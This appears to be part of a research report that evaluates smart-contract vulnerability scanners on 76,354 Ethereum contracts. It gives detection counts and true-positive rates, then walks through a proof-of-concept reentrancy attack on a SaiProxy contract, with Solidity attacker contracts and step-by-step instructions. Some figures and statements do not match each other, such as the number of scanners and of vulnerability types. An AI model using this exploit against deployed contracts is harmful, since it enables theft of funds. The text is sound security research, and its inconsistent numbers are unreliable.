#################################################
Evaluations and Analysis on 76354 Smart Contracts
#################################################

**Table 1: The number of detected vulnerabilities at contract level and true positive (TP) rate of each scanner.**

+--------------------------+--------------+--------------+--------------+----------+
| Vulnerability (TP Rate)  | Slither      | Oyente       | Smartcheck   | Securify |
| -------------------------+--------------+--------------+--------------+----------+
| Reentrancy               | 498 (9.24%)  | 108 (50.93%) | x            |          |
+--------------------------+--------------+--------------+--------------+----------+
| Abuse of tx.origin       | 34 (100.0%)  | x            | 210 (29.05%) | x        |
+--------------------------+--------------+--------------+--------------+----------+
| Unchecked low level call | x            | x            | 551 (65.70%) | x        |
+--------------------------+--------------+--------------+--------------+----------+
| Unexpected revert        | 666 (35.29%) | x            | 274 (93.79%) | x        |
+--------------------------+--------------+--------------+--------------+----------+
| Self destruct            | 46 (23.91%)  | x            | x            | x        |
+--------------------------+--------------+--------------+--------------+----------+

As shown in Table 1, we apply the three scanners on the six types of vulnerabilities. Overall, among these three scanners, **Slither** seems to achieve the best results, reporting most vulnerabilities---totally 2631 vulnerability candidates of five types. In contrast, **Smartcheck** reports 1072 candidates and **Oyente** reports only 588 candidates.  However, due to the  internal detection mechanisms, each scanner inevitably yields some FPs.

After manual inspection of human expertise, the TP rate is shown at the second row of each cell in Table 1. In generally, **Slither** reports the most candidates, but suffers from a big issue of a high FP rate. Especially for reentrancy, the TP rate of **Slither** is only about 9%. As dynamic analysis is more accurate, **Oyente**'s TP is still acceptable. To some extent, it is unexpected that the TP rate of **Smartcheck** is good. We review some FPs of these scanners as below.

As the reentrancy caused some significant losses in the past `daoAttack https://doi.org/10.1109/ICSAI.2017.8248566`_, the real contracts on Ethereum have already adopted some DMs to prevent from the actual invocation of reentrancy.  We summarize the five main categories of DMs: 

Attack code:
::

    contract TubInterface {
        constructor() payable {}
        SaiProxy s;
        address victim;
        bytes32 temp;
        address gemp;
        function setVictim(address _addr, address _gem) {
            s = SaiProxy(_addr);
            victim = _addr;
            gemp = _gem;
        }
        ...
        function cups(bytes32 cup) public returns (address, uint, uint, uint){
            return (victim, 0, 0, 0);
        }
        function gem() public view returns (TokenInterface){
            return(TokenInterface(gemp));
        }
        ...
    }

    contract TokenInterface {
        bytes32 temp;
        address tubbb;
        SaiProxy s;
        TubInterface tub = new TubInterface();
        function setVictim(address _addr, address _tub) {
            s = SaiProxy(_addr);
            tubbb = _tub;
        }
        constructor() payable {}
        ...
        function deposit() public payable{
            s.lock.value(1 ether)(tubbb, temp);
                //s.open(this);
        }
        ...
    }

Attacked code:
::

    contract SaiProxy is DSMath {
        ...
        function lock(address tub_, bytes32 cup) public payable {
            if (msg.value > 0) {
                TubInterface tub = TubInterface(tub_);

                (address lad,,,) = tub.cups(cup);
                require(lad == address(this), "cup-not-owned");

                tub.gem().deposit.value(msg.value)();
                ...
            }
        }
    }

In this case, the goal of our reentrancy is ``tub.gem().deposit.value(msg.value)();`` in the victim code. To reach our goal we need pass three conditions. Firstly we need to make sure the *msg.value* is greater than 0. Next we need to declare a new ``TuberInterface`` instance and call its ``cups`` function to return a address to the variable ``lad``. Last, we need to make sure the address stored in `lad` equals to the address of the victim contract.

**Preparation.** We call ``setVictim`` function in attack code to set the address of victim code to the variable ``_addr`` and set the address of the other attack contract ``TokenInterface`` to ``_gem``. Next we call the other ``setVictim`` function in contract ``TokenInterface`` then set the address of victim code to ``_addr`` and set ``tubbb`` an address the same as ``_addr``. 

**Attack.** The attacker call `deposit` function, it calls ``lock`` function in victim contract.  The ``if`` condition is satisfied because we our call is appended by ``.value``. Next, the contract initialize  an instance of the contract ``TubInterface`` and call ``cup`` to get the address. Unfortunately, the function involved in this attack is well manipulated and we won't let it fail. Then the contract checks whether the ``lad`` equals to the address of the victim contract. It doesn't work. We finally get to the key statement ``tub.gem().deposit`` which calls back to the `gem` function in attacker's contract. Hence, a call loop is formed and we achieved a *Reentrancy* attack.